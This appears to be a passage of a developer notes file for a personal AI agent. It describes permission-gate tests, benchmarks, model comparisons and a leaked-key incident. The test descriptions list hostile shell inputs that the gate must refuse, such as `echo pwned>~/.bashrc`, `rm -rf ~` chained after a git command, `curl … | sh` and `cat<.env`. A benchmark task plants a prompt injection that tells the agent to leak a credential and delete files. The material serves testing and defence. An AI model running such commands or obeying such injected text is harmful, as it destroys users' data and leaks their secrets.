  both new files being SELF_PROTECTED. Since 2026-08-17 it also owns the
  **separator and gluing** cases — a bare `&` splitting, glued redirects
  (`echo pwned>~/.bashrc`) and glued inline source (`python -c"import os"`)
  all falling to ASK, quote-aware segmentation keeping `git commit -m 'fix A &
  B'` at ALLOW, and `command_stems` refusing to enumerate a substitution — and
  a **`run_readonly` section**, because that tool is ungated and its allowlist
  is therefore the whole boundary: 39 escapes (newline and `&` separators,
  `env sh -c` wrappers, the writing git subcommands, `cat<.env`, and `find` in
  its `-exec`/`-delete` forms) refused and 14 ordinary reads still unattended.

  Since the same day it also owns **both narrowing suites**, because a
  boundary is only correct together with the ordinary work it lets through.
  `redirect_shape_checks` grades 21 redirect shapes on whether they write to a
  path — fd-duplication and quoted `>` do not, `&>file`, `>&word`,
  `2>/dev/null` and `2>&1>out.log` do — and pins `2>&1` surviving
  segmentation intact. `run_readonly_narrowing_checks` pins 21 git reads and 9
  quoted metacharacters still running unattended, alongside the writing form
  of every subcommand it names. Run after touching `rules.py`,
  `tools/shell.py`, `command_review.py`, `permissions.gate`, or `dispatch()`.
- `tests/permissions_check.py` — free checks for modes and the allowlist:
  gate ordering, stem vs whole-tool matching, persistence without
  duplicates, mode "all" bypass, and the broker's ALWAYS path writing an
  entry. Since 2026-08-17 also the two halves of the one-word-wide hole:
  **every segment must be covered** (a `git` entry covers `git push` and
  `nohup git push`, and covers none of `git status && rm -rf ~`, the `;`/`&`/
  `|`/newline spellings of it, a `$(...)`, or a `curl … | sh`) and the gate
  really handing a smuggled line to the surface approver; plus **no path mints
  a wildcard** — `entry_for` raises on an empty or compound command, and a
  prefix-less command entry written straight into the JSON authorises nothing.
  Plus the narrowing: a **full-path entry still matches** (`/usr/local/bin/
  mytool run`, wrapped, and beside a `git` entry on one line) while covering
  only itself — not the bare basename, not the same name under another path,
  not a string prefix of it, and not a second command riding behind it.
  Run after touching `permissions.py`, `rules.command_targets`, or
  `approvals.py`.
- `tests/skills_check.py` — free checks for skill tools (round-trip, bad
  names, starter skills parse) and the index: render/refresh/cap, plus
  agent-level injection against a faked `llm.chat` (present and per-turn
  fresh for skill-armed agents, absent for others, mid-session skills
  visible next turn).
- `tests/workflows_check.py` — free checks with a faked `llm.chat`:
  background lifecycle, status/log tools, deny-all approver, safe toolset,
  concurrency cap. Run after touching `workflows.py`.
- `tests/tasks_check.py` — free checks for attended background tasks, with
  `llm.chat` scripted, `shell._run` a recorder, the broker on approval_check's
  FakeWindow and the DM sender injected. The headline: a task's dangerous call
  raises the card **with the task's origin label**, approve runs it, deny does
  not, and the same flow works remotely (DM carries the origin line, a typed
  yes runs it). The capture properties both ways: a real gate keeps its
  human-backed flag inside a task (an ALLOW `git commit` runs with **no
  card**), and an unbound context yields a deny-all task. The
  nothing-changed half: with no origin bound the SSE payload has no origin key
  and the DM body is byte-identical to the pre-task shape (verified to bite
  against unconditional attribution). Plus: toolset exclusions and task tools
  absent from `workflows.SAFE_TOOLS` / `SUBAGENT_TOOLS` / `goal_tool_names()`,
  the context-block section for armed agents only, the concurrency cap,
  cancel landing at the step boundary *without* resolving a pending card, the
  label sanitizer, and origin inheritance through `copy_context()` with no
  cross-context leak. Points `config.ALLOWLIST_PATH` at a temp file for the
  whole run. Run after touching `tasks.py`, `tools/tasks.py`, `runtime.py`,
  or `ApprovalBroker.request`.
- `tests/discord_approvals_check.py` — free checks for remote approval, with
  the DM sender injected (no network): yes/no/always resolve the exact
  request, a "yes" in a guild channel is not an authorization, two open asks
  refuse a bare yes and need the code, unparseable replies resolve nothing, a
  spent code is dead, and every failure mode (no channel, timeout,
  window-closed, shutdown) denies. Run after touching `discord_approvals.py`
  or `ApprovalBroker.request`.
- `tests/daemon_check.py` — free synthetic checks for the headless daemon
  (fake listener + stub DM channel, loopback HTTP only): the shared
  DiscordResponder keeps spoken turns away from the approval parser, a
  windowless broker denies nowhere-to-ask / on remote timeout, and
  `detach_remote()` stops remote asks entirely; the health endpoint is the
  single-instance lock, the daemon refuses to start over a running face, and
  `stop()` releases blocked approval waiters with a denial. Hermetic against
  a real face running on 8402 (probes point at dead ports). Run after
  touching `daemon.py`, `discord_agent.py`, or `ApprovalBroker`.
- `tests/goals_check.py` — free synthetic checks for background goals
  (scripted fake agent, DMs into a list, store on a temp dir): store
  round-trip + runner-written journal + active() ordering; `goal_report`
  through real dispatch (armed-only, one-shot, validated); slices until
  done with costs tallied and start/done DMs; steering interrupting the
  in-flight turn and landing as the next slice's `[owner steering]`
  message; every budget ceiling parking with spend in the DM; cancel at
  the boundary; shutdown leaving `running` for restart-resume; interval
  digests carrying cost + the live plan; and the daemon router keeping
  verbs typed-only (a spoken "goal cancel" is conversation). Run after
  touching `goals.py`, `goalrunner.py`, `tools/goalctl.py`, or `_route`.
- `tests/sessions_check.py` — free checks for session memory: record→reload
  round-trip (and that the system message is never persisted), image payloads
  stripped on save, the append-only log surviving compaction of the
  transcript, the recent-sessions index (renders, marks the current one, empty
  store → ""), the four read tools with a stubbed summarizer (including that
  the summary cache invalidates on a new turn), the Agent binding (a second
  Agent resumes the first's transcript; the index only reaches session-armed
  agents), and that a cancelled turn is still saved. Run after touching
  `sessions.py`, `tools/sessions.py`, or `Agent.run_turn`.
- `tests/face/hud_session_check.py` — free headless check of the session
  picker in the real `jarvis.html` (hud_state_check's puppet pattern): boot
  onto a resumed conversation redraws its log and counters, the picker lists
  and marks the current one, PTT is inert while it is open, switching redraws
  from the joined session, NEW clears everything, Escape switches nothing, and
  an SSE `session` broadcast relabels without touching the log.
- `tests/face/controls_check.py` — free server-level checks: /mute flips and
  broadcasts, /config reports mute+permissions, /approve with always=true
  both unblocks the agent and persists the entry, and /session switches the
  bound conversation (rebuilding the agent) with 403/404/400 on the bad paths.
- `tests/face/approval_check.py` — free synthetic checks for the approval
  gate: the broker (approve/deny/timeout/no-window/replay/window-closed), the
  `/approve` route against a real server with a real SSE subscriber, that
  `dispatch()` neither runs a denied tool nor blocks an approved one, and that
  the face's origin is refused by the browser and web tools.
- `tests/face/hud_approval_check.py` — free end-to-end check of the card in
  the real `jarvis.html`, headless: SSE → card → click → the blocked agent
  thread wakes with the answer. Also covers Escape-denies, PTT being inert
  while a card is up, and timeout withdrawal. Run both after touching
  `approvals.py`, the face server, or the HUD.
- `tests/face/whiteboard_check.py` — free end-to-end check of the whiteboard
  with a stubbed designer: real page JS in headless Chromium (draw → export →
  POST /design → reply + preview iframe), shape tools via real pointer drags
  (rect/circle/line commit ops, Shift constrains, undo pops, letterbox
  coordinate math), the ATTACH toggle (sketch vs
  text-only), the route's mtime-diff file detection, the workshop origin with
  no-store, and `Agent.run_turn(images=…)` building a proper multimodal user
  message against a fake `llm.chat`. Run after touching `/design`, the
  whiteboard, or the workshop server.
- `tests/face/whiteboard_smoke.py` — real sketch → Luna → served design
  (~$0.002-0.02/run); scripted sketch for comparability, human grades the
  rendered PNG. First run 2026-07-31: 4 steps, $0.0024, honored both layout
  and the color annotation.
- `tests/face/hud_converse_check.py` — drives the real `jarvis.html`
  conversation path in headless Chromium (real API calls, ~$0.001). Exists
  because a client-side bug ("Fault: HTTP 200" — the error check matched
  "json" against the `application/x-ndjson` success type) sailed past the
  Python-client streaming test. Lesson: test the HUD's own JS, not just the
  routes it calls. Run after touching `/converse` or the HUD's converse().
- `tests/face/cancel_check.py` — **free** checks for mid-turn cancellation,
  with `llm.chat` stubbed so the cancel can be dropped at an exact point in
  the loop. The one that matters: cancelling while a tool is running must
  still return every tool result (invariant 3). Run it after touching
  `run_turn`.
- `tests/face/attach_check.py` — free checks for typed input + attachments
  on `/converse`: message assembly (speech+typed+files into one user
  message, @path resolution, images as multimodal parts, caps surfacing as
  notes), protected-file refusal and credential-value scrubbing, typed-only
  turns skipping STT, and the legacy raw-webm body still working. Run after
  touching `_assemble_turn`, `_converse`, or `run_turn(images=…)`.
- `tests/voice_speakable_check.py` — free checks for `voice.speakable()`, the
  markdown→speech strip: 16 constructs lose their syntax and stay idempotent,
  6 lookalikes (`snake_case`, `2 * 3 * 4`, prose) come back byte-identical,
  fences are dropped rather than read aloud, and `tts()` applies the strip
  itself so no speech path can forget. Run after touching `voice.py`.
- `tests/voice_pocket_check.py` — free checks for the Pocket TTS backend, a
  fake `pocket_tts` injected into `sys.modules` (its sample rate deliberately
  16000, not Kokoro's 24000, so a hardcoded rate fails). The cases that
  matter are the degradations, written to fail against the pre-pocket code:
  a raising backend, a missing store voice, the library absent, and a
  `JARVIS_TTS_VOICE=pocket:x` loop all land on a Kokoro name — the cloud
  never once sees a `pocket:` name. Also: routing at the backend's own rate
  with model/state cached, the speed-ignored-once warning, `set_voice`
  accept/reject/clear, an avatar speaking a pocket voice, the `_blend`
  mixing math on numpy (normalization, head-keeping seq trim, every loud
  refusal), clone/mix/rm store round-trips, and `/voices` + `POST /voice`
  against a real threaded server (grouped entries, `""` clears the override,
  404/403). Run after touching `pocket.py`, `voice.py`, or `_switch_voice`.
- `tests/face/hud_markdown_check.py` — free headless checks that the HUD
  *renders* his markdown in the real `jarvis.html`: 13 constructs become
  elements, `textContent` still holds the words (what the other HUD suites
  assert against), the owner's own message is left verbatim, and a reply
  cannot inject markup or a `javascript:` href into the surface that gates
  approvals. Run after touching `renderMarkdown`/`addMsg`.
- `tests/face/hud_input_check.py` — free headless checks of the input bar
  in the real `jarvis.html` (hud_state_check's puppet pattern): Enter sends
  the JSON envelope and the words render at send time, staged files ride
  the next send and clear after, empty Enter is inert, and Space typed in
  the box does not trigger push-to-talk.
- `tests/face/hud_wake_check.py` — free headless checks of the wake phrases
  in the real `jarvis.html`: "jarvis" fires, ordinary speech never does, the
  `bibi` avatar's phrases ("big yahu", "netanyahu", "bibi") are silence on
  the default and all 20 spellings fire once that avatar is applied — in the
  spellings Chrome's recognizer actually returns for a phrase it has never
  heard — and the armed hint names whatever is live. Since 2026-08-22 it also drives
  the real `recog.onresult` through a scripted `SpeechRecognition`: a bare
  phrase fires **once** rather than once per delivery, carrying on talking does
  not re-fire, a new phrase in a later segment does, ordinary speech in a new
  segment stays silent, and a restarted recognition session (indices back to 0)
  fires again. Run after touching `WAKE_PATTERNS`, `matchesWake`, or
  `armRecognition`.
- `tests/face/hud_state_check.py` — **free** checks for the HUD turn state
  machine, and the pattern to copy for anything else in the window: a
  *scripted* `/converse` and `/events` on `queue.Queue` puppet strings serve
  the real `jarvis.html`, so every phase transition is driven on cue with no
  API calls and no timing luck. Covers phase order, the mid-turn transcript,
  tool start/finish, the elapsed clock, and that a late SSE tool event cannot
  rewind a later phase.
- `tests/desktop_check.py` — free synthetic checks for desktop control, no
  Windows needed: snapshot rendering and ref staleness against a dict-tree
  fake backend (this is why `windows/uiatree.py` has no Windows imports), the
  app allowlist including that a shell/browser/file-manager is never
  registered, the wire protocol against a fake bridge on a real loopback
  socket (error propagation, mid-request death, no-bridge message), and that
  no desktop tool takes a title/handle/path or reaches background workflows.
  Since 2026-08-17 it also pins `forbidden_title()` as a **substring** match
  (a suffixed or prefixed HUD title is still refused, because bridge.py finds
  windows by substring) and reads both `<title>` tags out of the real
  `jarvis.html` / `whiteboard.html` rather than trusting hardcoded copies —
  renaming a page used to disarm the check silently. Run after touching
  `desktop.py`, `tools/desktop.py`, `windows/bridge.py`, or
  `windows/uiatree.py`.
- `tests/models_check.py` — free synthetic checks for the model roster, with
  `llm.catalog` replaced by a fixture and both state files in a temp dir. The
  headline is the refusal: a model that cannot call tools, an invented id, an
  image-only model, `openrouter/auto` and a `:batch` variant all fail to reach
  the roster. Plus prices converted to dollars-per-million, unrated staying
  `None` rather than 0, the cache fetched once and surviving an outage with a
  stated reason, a corrupt roster file degrading to the default, removing the
  selected model clearing the selection, `tier()` moving the followers while
  `worker`/`cheap` stay, `Agent()` with no `model=` picking up the selection,
  and the routes end-to-end (`/model` moving the **live** agent without
  rebuilding it, 400/403/404). Since the same day it also owns **reasoning
  effort**: clamped down to the model's own ladder, absent for a model with no
  reasoning block, the requested level on a cold cache, `""`/`default`/a typo
  all sending nothing, and — the one that matters — the agent loop putting
  `reasoning: {effort}` on the wire while `delegate(tier="cheap")` does not.
  Since 2026-08-23 it also owns the **per-model effort pin** (beating the
  global, refused off-ladder and on a model with no reasoning control, not
  outliving its model, and both the setting and its consequence in
  `describe()`) and **BYOK cost accounting** — the measured credit-billed and
  BYOK usage shapes, and `Reply.cost_usd` carrying the upstream figure when
  the credit line reads zero. Run after touching `models.py`, `config.TIERS`,
  `config.REASONING_EFFORT`, `llm._cost`, or the `/model*` routes.
- `tests/face/hud_model_check.py` — free headless checks of the picker in the
  real `jarvis.html`: CORE opens the shortlist with the default marked, ADD
  MODEL browses the catalog, search matches name and id, the price and
  intelligence filters narrow it (and the unrated exclusion is stated), a row
  toggles roster membership, Escape backs out of the catalog to the shortlist
  before closing, selecting relabels CORE, the × removes without selecting,
  and an SSE `model` broadcast relabels live. The effort control is covered
  too: drawn only for models that publish a ladder, offering that model's own
  levels rather than one shared list, AUTO naming what the default resolves
  to, and — the one worth having — **setting it does not also switch him onto
  that model**, which is what clicking the row does. Two that are not
  cosmetic: **a model name carrying markup renders as text** (names come off the network and
  this window draws authorization cards), and **a space typed in the search box
  does not trigger push-to-talk**.
- `tests/browser/math_drill_smoke.py` — headed end-to-end browser test: serves
  a local JS-rendered form wizard (`tests/browser/pages/math-drill/`) and has
  the agent complete it. Real API calls (~$0.001/run); the window stays open
  after the run so a human can grade via the page's Copy JSON button. Verify
  page changes free first with a headless Playwright click-through.
- `tests/browser/policy_check.py` — free synthetic checks for the internet
  policy: public-vs-private address matrix (IP literals, no DNS), resolver
  cases via a monkeypatched `getaddrinfo` (a public name resolving to
  loopback/LAN is refused), `fetch_page` refusals before the request and
  after a redirect, and a headless redirect off a pinned allowlist that must
  back out to about:blank. Run after touching `BrowserPolicy`,
  `config.is_lan_host`, or `fetch_page`.
- `tests/browser/thread_check.py` — free checks for invariant 7: after a
  browser action no event loop is parked on the caller (prompt_toolkit must
  still prompt — the chat-REPL crash), fresh threads can reuse the session
  (the face's request threads), and errors cross the thread boundary. Run
  after touching `Session._submit` or the browser lifecycle.
- `tests/browser/vocab_drill_check.py` — free synthetic checks for the vocab
  drill page: determinism (same seed ⇒ identical sequence), a full solve of
  all four question types, the idle detector, and the session timer. Run it
  after any change to `vocabbench/index.html`. It solves via the
  `window.__answerKey` test backdoor, which agents cannot reach (no JS-eval
  tool).

## Model facts (verified 2026-07-30 via the OpenRouter catalog)

| Model | Tool calling | Vision | Context |
|---|---|---|---|
| `openai/gpt-5.6-luna` | 8/8 | yes | 1.05M |
| `openai/gpt-oss-20b` | 8/8 | **no** | 131k |
| `qwen/qwen3.7-flash` | 8/8 | yes | 1M |
| `mistralai/mistral-nemo` | 6/8 (fails multi-step) | no | 131k |
| `meta-llama/llama-3.1-8b-instruct` | 6/8, flails | no | 131k |
| `google/gemma-3-12b-it` | 2/8 — emits ` ```tool_code ` text, not native calls | yes | 131k |
| `inclusionai/ling-2.6-flash` | 8/8 | no | 262k |
| `deepseek/deepseek-v4-flash-0731` | not run | **no** | 1.05M |
| `deepseek/deepseek-v4-pro` | not run | **no** | 1.05M |

Two findings worth keeping:

- **Cheap per token ≠ cheap per task.** llama-3.1-8b is priced below Luna and
  cost 65% *more* on the bench, because wasted turns re-send the whole
  transcript. Optimize `$/completed task`.
- **Tool-calling support varies by provider**, not just by model. Gemma's
  behavior depended on which backend OpenRouter routed to.

## Decisions already made — don't relitigate

- **No framework.** See "What this is".
- **Did not fork Grok Build** (xAI's open-sourced Rust coding agent). Useful to
  *read*; wrong base — 845k lines of Rust, coding-agent-shaped, and inheriting
  it defeats the learning goal.
- **Will not use leaked Claude Code source.** Proprietary code obtained without
  authorization; the Agent SDK and public docs cover the same design ground.
- **Membean bench was declined.** Membean is teacher-assigned, engagement-
  monitored schoolwork; an agent completing it produces a false report to a
  teacher, and every eval run would be a real submission. Building
  **`vocab-bench`** instead — a local, seeded, deterministic replica of the same
  difficulty profile. That is also the better benchmark: repeatable, shareable,
  CI-able, no bans.
- **Model routing policy (2026-07-30).** Default all real work to
  `openai/gpt-5.6-luna`. Do not route personal data (chat, transcripts,
  compaction summaries) to Chinese-hosted models — the cheap tier moved
  qwen3.7-flash → gpt-oss-20b for exactly this reason. Multi-model
  comparisons remain opt-in by naming models explicitly on `jarvis bench`.
  If Luna hits a capability wall, escalate the orchestrator to GPT-5.6 Terra
  or Claude Sonnet 5.
- **Semantic/RAG memory deferred.** Memory is one markdown file per fact, pulled
  on demand via tools, so nothing is auto-injected. The upgrade ladder is
  substring → SQLite FTS5/BM25 → embeddings, and the tool interface
  (`memory_search(query) -> text`) is the contract, so swapping backends changes
  nothing else. Revisit when search visibly misses.

## Current state (2026-07-30)

Working: agent loop, tier routing, memory tools, file/shell tools with gating,
web search + page fetch, context management, browser control (Playwright,
headed via WSLg, snapshot + screenshot channels), tool-calling bench.

Browser control validated end-to-end 2026-07-30: Luna completed a randomized
4-question JS-rendered form wizard (`tests/browser/`) on snapshots alone —
21 steps, 27.8s, $0.0013, 4/4 correct, zero stale-ref or retry errors. The
snapshot→act→re-snapshot discipline held without prompting beyond the task
text. De-risks the vocab-bench browser loop.

**`vocab-bench` is built** (2026-07-30). `vocabbench/index.html` is the seeded
drill — timed session, idle-detector overlay, four JS-rendered question types
(multiple choice, fill-in-blank, matching, spelling), every random draw routed
through a `mulberry32(seed)` PRNG so one seed fixes the exact question
sequence for every model. `jarvis bench --family vocab` runs it with the real
browser and real agent loop (`jarvis/vocabbench.py`, headless by default,
`JARVIS_BROWSER_HEADLESS=0` to watch); scoring is read back from
`window.__vocabResults`, which the agent can neither see nor set.

First roster sweep (`vocab-snap`, seed 42, 2026-07-30): **Luna 6/6** (33 steps,
37.5s, $0.0023) and **qwen3.7-flash 6/6** (30 steps, 50.7s, $0.0021);
**gpt-oss-20b failed** — the trace shows it opened the page and then produced
no valid browser action for 16 straight rounds before giving up, despite being
8/8 on the canned tool bench. New finding to keep: **single-shot tool-call
success does not predict long-horizon browser loops** — the canned bench and
vocab-bench measure different capabilities.

**agent-bench shipped (2026-08-02)** — the bench that measures *Jarvis*, not a
model's tool calls or one browser skill. `jarvis bench --family agent`
(`jarvis/agentbench.py`) runs five multi-turn tasks through the real agent
loop, with the real `config.SYSTEM_PROMPT`, the real tool registry, the real
context manager, the real approval gate and real background workflows —
against a **hermetic sandbox**: a temp cwd, with `MEMORY_DIR` / `SKILLS_DIR` /
`SESSIONS_DIR` / `ALLOWLIST_PATH` swapped to temp copies, no network tool in
any toolset, and `workflows.SAFE_TOOLS` stripped of web tools for the run.
Nothing of the owner's is reachable, so it is safe to leave unattended.

Scoring generalizes vocab-bench's rule — **grade the world the agent left
behind, not the prose it wrote.** Every check reads the sandbox afterwards:
files on disk, memory entries, skill frontmatter, which workflows reached
`done`, which dangerous calls hit the approver. Checks are tagged by category,
so one task feeds several ratings and the report is five ratings plus an
overall (weighted, passed over possible), not one pass/fail:

| task | what it puts under load |
|---|---|
| `project` | explore a fixture repo, edit code, read-before-write on a pre-existing CHANGELOG, recall a number two turns later |
| `recall` | memory + skills round trip — save a fact and a skill, then fire the skill *unprompted* off the injected index |
| `pressure` | a prompt injection in a vendor doc telling him to leak a `.env` key and delete a directory, then a genuinely-requested dangerous command that the approver **denies** |
| `orchestrate` | four background workflows (against `MAX_CONCURRENT=3`), monitored, then merged into a correct ranking — and *did he delegate, or do it inline?* |
| `long-haul` | seven turns under a deliberately tight `ContextPolicy`, with a codename planted in turn 1 that must survive compaction |

First results (2026-08-02): **Luna 100%** across all five categories, $0.0065,
115s. **gpt-oss-20b 46% overall — and 0% multiagent**, at $0.0116: nearly
double the cost to fail, the same "cheap per token ≠ cheap per task" finding
the canned bench produced, now reproduced on whole-agent work. Run-to-run
variance is real (an earlier Luna sweep scored 93%, missing line counts on
`project`); treat a single run as a sample, not a verdict.

**Challenger sweep 2026-08-05 — Luna held.** Three models were run against
agent-bench and vocab-bench looking for a replacement or backup; none beat it:

| model | agent-bench | cost | vocab-snap | cost |
|---|---|---|---|---|
| `openai/gpt-5.6-luna` | **100%** | **$0.0065** | 6/6 (33 steps) | **$0.0023** |
| `deepseek/deepseek-v4-flash-0731` | 93% | $0.0085 | 6/6 (26 steps) | $0.0020 |
| `deepseek/deepseek-v4-pro` | 96% | $0.0526 | 6/6 (34 steps) | $0.0147 |
| `qwen/qwen3.7-flash` | ~91% | $0.0086 | 6/6 (30 steps, 2026-07-30) | $0.0021 |
| `inclusionai/ling-2.6-flash` | 70% | $0.0062 | not run | — |

Luna scored highest *and* cost least — the decision stands, and the burden is
on any future challenger to beat both columns at once. What the sweep taught:

- **Every non-Luna model gave ground in the same place: `multiagent`.** Both
  DeepSeek models scored 82% and ling 27% (gpt-oss-20b: 0%), all failing the
  same check — *delegated instead of doing it inline*. Background-workflow
  orchestration is this project's discriminating task; a model can be perfect
  on safety and long-horizon and still refuse to delegate.
- **Both DeepSeek V4 models are text-only.** That alone disqualifies them as
  orchestrator: `cad_render`, `browser_screenshot`, `desktop_screenshot` and
  the whiteboard's `run_turn(images=…)` all go blind. Check
  `architecture.input_modalities` before benching anything, not after.
- **"Cheap per token" failed a third time, hardest yet.** v4-pro lists at ~4x
  Luna's input price and cost **8x** per task — lower-quality steps mean more
  steps, and every step re-sends the transcript. ling-2.6-flash lists at 1/30th
  Luna's price and cost the *same* per run.
- **The listed price may not be reachable.** OpenRouter's training opt-out
  refuses to route to providers that train on prompts, so DeepSeek's own
  first-party endpoint 404s from this account — v4-pro's headline $0.435/$0.87
  and $0.0036 cache reads are unobtainable, and the real floor is StreamLake at
  $0.652/$1.305. Check reachability by pinning with `allow_fallbacks: false`
  before quoting a price.
- **`qwen3.7-flash` is the best *backup* tested, and still not an upgrade.**
  ~91% at $0.0086 (32% dearer than Luna despite listing at 1/3 the price), and
  it **lost the planted codename across compaction** — the one thing both
  DeepSeek models kept. But it is the only challenger with **vision and 1M
  context**, so it is the fallback that leaves `cad_render` and
  `browser_screenshot` working. Its score is a composite: `orchestrate` died
  on a provider 400 and was re-run clean (13/15, same as both DeepSeeks).
- **A provider error mid-run used to read as a capability failure.** That 400
  crashed the `recall` grader with IndexError (`run.called(turn=N)` indexed
  `per_turn_calls` unguarded), so the task reported one bogus "grader crashed"
  check instead of scoring zero. The existing empty-run checks never caught it
  because they pad every per-turn list to full length — an empty run is
  *fully shaped*, a killed run is **short**. Both fixed 2026-08-05;
  `tests/agentbench_check.py` now grades every task at 0 and 1 recorded turns.
- **Pin by lowercase provider *tag*, and never with fallbacks on.**
  `{"order": ["DeepSeek"]}` (display name) silently routed to DeepInfra
  instead of erroring; the tag is `deepseek`. With fallbacks enabled a wrong
  pin is invisible. Related: these runs landed on **DeepInfra fp4** and
  **StreamLake fp8**, so quantization — and therefore answer quality — varied
  by whoever answered. `llm.chat()` gained an **opt-in** pin for this
  (`config.CHAT_PROVIDER` / `JARVIS_CHAT_PROVIDER`, 2026-08-05, empty by
  default so routing is unchanged; `llm.speech()` has had one since
  2026-07-31). Like the TTS pin it allows **no fallbacks**, which is what
  turns a wrong tag into a loud 404 instead of a silent reroute.
  **Since 2026-09-03 the pin may be an ordered comma list**
  (`deepinfra,novita,z-ai` → OpenRouter's `order` array, `allow_fallbacks`
  still false), added for the trading firm and verified live: with
  DeepInfra 429ing upstream the list fell through to Novita, and a
  single-tag `deepinfra` pin failed outright. Fallback *within* the list is
  the point; fallback *outside* it is still refused. The tag is the bare
  provider slug — `novita`, not the endpoint's `novita/fp8`, which routes
  nowhere. `tests/stream_check.py` owns it (`provider_pin_checks`).

Three things learned building it, each worth keeping:

- **A safety rating a rock can pass measures nothing.** The first `pressure`
  grader gave an agent that did *nothing at all* 56% on safety — it leaked no
  credential and deleted no logs because it never worked. Passive safety
  checks are now conjunctions with having done the job, and
  `tests/agentbench_check.py` asserts every task scores near zero on an empty
  run. The corollary is in the check *names*: a conjunctive check has to say
  so ("did the job and left logs/ alone"), or a reader misreads a failure as
  the unsafe act rather than the missing work.
- **A context threshold has to be measured, not guessed.** `long-haul` first
  ran with `compact_at_tokens=3500` and compaction never fired once — the
  transcript peaks near 3.2k, and `manage()` tests compaction against the
  estimate *after* truncation has already shrunk it. So the codename check was
  quietly only proving survival of truncation. At 1800 the cut lands inside
  the run (34 messages compacted) and the check means what it claims. Set
  `JARVIS_AGENTBENCH_KEEP=1` to keep the sandbox and print peak tokens /
  truncations / compactions.
- **This is the only test that exercises `context.py` against the live API.**
  The synthetic suite proves the mechanics; `long-haul` proves OpenRouter still
  accepts what comes out the other side, which is invariant 1 with a real 400
  waiting if it breaks.

**Snapshot vs vision, same seed, Luna (2026-07-30).** Vision mode is honest
now: `browser_screenshot` draws set-of-marks badges (the same refs snapshot
assigns, so clicking needs no text channel) and `vocab-vision` runs with no
`browser_snapshot` at all. Result — both modes 6/6, but vision took 39 steps
vs 33, 98s vs 38s, and $0.0117 vs $0.0023: **~5× the cost for equal
accuracy**. Confirms the design bet that text snapshots are the default
channel for web work; screenshots are for when layout or rendering actually
matters. Caveat: the vision run finished at 39 of 40 steps — raise
`max_steps` for vision tasks before longer sweeps.

**Secret-leak incident (2026-07-30).** Asked which provider serves Luna,
Jarvis ran an approved `grep -RIn 'provider|openrouter' ~/projects/Jarvis` and
printed the live `OPENROUTER_API_KEY` from `.env` into the transcript — so the
key went to OpenRouter as context and landed in `traces/` and
`.jarvis_history`. **Key rotated 2026-07-30; protection added** (*Safety
design*). **The residue is gone, verified 2026-08-23** — this file used to say
the dead key still sat verbatim in the older `traces/` files and
`.jarvis_history`, and that is no longer true: `.jarvis_history` is a readline
file that has been rewritten many times since, and `traces/` now holds only
Playwright archives. Searched and confirmed clean at zero occurrences:
`.jarvis_history`, the *contents* of all 16 `traces/*.zip` (a plain grep cannot
see inside a zip — that is why an earlier pass came up empty for the wrong
reason), `~/.local/share/jarvis/` including spill and sessions,
`~/.config/jarvis/`, the shell histories, and the entire git history across
every ref. The key never entered version control at all, which matters because
this repo is public.

Two things worth keeping from the re-check rather than the incident. **A stale
security note is its own small hazard**: a file saying "a live-format
credential is sitting here" sends a future reader hunting for something that is
not there, and teaches them to treat disposable debug output as sensitive. And
**grep found `sk-or-v1-F` in a spill file and it was not a key** — it was this
document's own example of the count-mode match oracle, quoted back through a
truncated tool result. A scanner that cannot tell a credential from a
description of one produces exactly the false positive that gets a real alert
ignored later.

The lesson worth keeping: **the
dangerous read was the one that never named the file.** A path denylist alone
would have waved this through, which is why the scrub sits at `dispatch()` —
the last point before a string becomes a `tool` message — and not in
`read_file`. Layers 1–2 are ergonomics (a clear refusal the model can act on);
layer 3 is the real protection, and it is an accident backstop, not a sandbox:
a model that wanted to defeat it could still base64 a value past it. The
actual boundary would be filesystem permissions on the key.

**Face & voice underway (2026-07-30), phases 0–1 done.** Decisions made with
the owner: the face is a **web HUD run in Chromium app mode** (chromeless
window via the Playwright Chromium; profile in `~/.cache/jarvis-face` and
**port fixed at 8402** — both preserve the origin-scoped mic grant, do not
change either); activation is **push-to-talk** v1, wake word later. All audio
I/O happens in the browser (getUserMedia + `<audio>`), so Python needs no
PortAudio. Phase 0 verified the mic→record→playback round trip in the
app-mode window (clear audio, peak 59%).

Phase 1 shipped Jarvis's voice: `voice.tts(text) -> mp3` (`jarvis/voice.py`,
swappable contract) → `llm.speech()` (HTTP stays in llm.py) → OpenRouter
`/api/v1/audio/speech`, served to the window via `POST /say`
(`jarvis/face/server.py`). **TTS model: `hexgrad/kokoro-82m`, voice
`bm_george`** — $0.62/M chars, ~25× cheaper than every other hosted voice and
already a composed British male. Gotchas: the OpenRouter TTS docs' example
model id does not exist — the **collections pages are the source of truth**
for audio model ids; every TTS provider requires an explicit `voice`, and
voice names are provider-specific (change model and voice together). The
`speed` param works on Kokoro up to 1.3 but **silently truncates the audio
above that** (1.35 dropped a quarter of the speech) — `voice.tts()` clamps
to 1.3; default pace is `JARVIS_TTS_SPEED` (1.2).
`microsoft/mai-voice-2-flash` ($15/M, shipped 2026-07-23) is the premium
upgrade candidate but does not publish voice ids on its model page.

Phase 2 shipped the conversation loop: hold-to-talk in `talk.html` →
`POST /converse` (raw webm body) → `voice.stt()` → one persistent
`Agent.run_turn()` (voice-mode system prompt: short spoken replies; a real
conversation with memory for the life of the server) → `voice.tts()` → JSON
back with transcript, reply, audio_b64, per-stage timings, and cost.
**STT: `nvidia/parakeet-tdt-0.6b-v3`** — probed on real webm/opus
(`tests/voice_probe.py`): parakeet 100% @0.52s, grok-stt 100% @0.80s,
voxtral 100% @0.99s; `microsoft/mai-transcribe-1.5` rejects webm. Owner is
fine with voice audio going cloud; local whisper stays a `stt()` drop-in.
**`dispatch()` runs dangerous tools *unguarded* when `approve is None`**, so
the face server must always construct its Agent with a real approver — never
None, never `lambda: True`. (Phase 5 replaced the hard denier with the HUD
gate; the invariant is the same.) A full voice turn costs ~$0.0002.
Launch: `jarvis face` (the CLI subcommand runs inside the venv, so it works
from any shell; bare `python -m jarvis.face` fails on the system Python —
no httpx). End-to-end self-test pattern: TTS a
question → Chromium re-records it as webm (`RECORD_JS`) → POST /converse.

Phase 3 shipped the HUD (2026-07-31): `jarvis.html`, styled to the owner's
reference (classic "Stark Industries" skin — cyan-on-black, canvas arc-
reactor orb with counter-rotating tick rings and triangle emblem, angular
panels). The orb is the PTT button and is audio-reactive (mic level while
listening, output level while speaking) with a state palette: idle/listening
cyan, thinking fast-spin, tool amber, error red. Panels: COMMS LOG
(transcript), SYSTEMS (clock, model readouts from `GET /config`, session
cost), OPERATIONS (live tool ticker fed by `GET /events` SSE — the agent's
`on_event` broadcasts `tool_start` mid-turn). Test hooks: `window.__hud`
(setState/setLevel/addMsg/addOp) for headless screenshot checks.

